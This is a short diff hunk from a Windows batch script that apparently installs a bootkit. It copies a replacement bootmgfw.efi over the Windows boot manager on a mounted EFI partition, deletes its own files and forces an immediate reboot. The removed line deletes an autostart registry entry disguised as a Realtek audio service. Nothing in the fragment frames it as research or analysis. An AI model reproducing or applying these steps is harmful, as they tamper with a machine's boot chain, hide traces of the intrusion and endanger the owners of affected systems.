@@ -8,7 +8,6 @@ if %errorLevel% == 0 (
     
     xcopy %~dp0bootmgfw.efi Z:\EFI\Microsoft\Boot\
 
-    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Realtek HD Audio Universal Service" /f
     del /q /f bootmgfw.efi
     del /q /f launch.bat
     shutdown /r /f /t 0
